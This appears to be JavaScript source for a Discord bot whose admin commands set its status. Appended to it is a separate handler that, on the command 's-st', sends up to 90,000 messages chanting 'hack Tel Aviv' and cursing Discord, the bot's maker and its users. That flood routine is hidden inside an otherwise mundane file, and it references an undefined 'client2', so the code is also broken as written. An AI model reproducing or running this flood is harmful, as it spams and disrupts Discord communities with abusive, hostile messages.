if(!Discord) var Discord = require('discord.js');
if(!client) var client = new Discord.Client();
if(!prefix) var prefix = "s-";

const adminprefix = "s-";
const devs = ['437653059871571970'];
client.on('message', message => {
  var argresult = message.content.split(` `).slice(1).join(' ');
    if (!devs.includes(message.author.id)) return;
if (message.content.startsWith(adminprefix + 'play')) {
  client.user.setGame(argresult)
    message.channel.sendMessage(`**:white_check_mark: | ${argresult}**`).then(message => {message.delete(6000)})
} else 
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.sendMessage(`**:white_check_mark: | ${argresult}**`).then(message => {message.delete(6000)})
  } else 
  if (message.content.startsWith(adminprefix + 'lis')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.sendMessage(`**:white_check_mark: | ${argresult}**`).then(message => {message.delete(6000)})
  } else 
if (message.content.startsWith(adminprefix + 'st')) {
  client.user.setGame(argresult, "https://www.twitch.tv/Allwai")
    message.channel.sendMessage(`**:white_check_mark: | ${argresult}**`).then(message => {message.delete(6000)})
}
});

client2.on('message', message => { // Hacker Hacker HACKER اللعنة علي الديسكورد , اللعنة علي مصمم هذا البوت الفاسق , اللعنة علي من يستخدمونه
if (message.content === 's-st') {
      let count = 0;
      let ecount = 0;
      for(let x = 0; x < 90000; x++) {
        message.channel.send(`**تهكر تهكر تهكر , هكر هكر تل ابيب هكر هكر تل ابيب , Hacker Hacker Isreal اللعنة علي الديسكورد اللعنة علي صاحب هذا البوت  **[ " ${x} " ]`)
          .then(m => {
            count++;
          })
          
        }
      }
});
client.login(process.env.BOT_TOKEN);
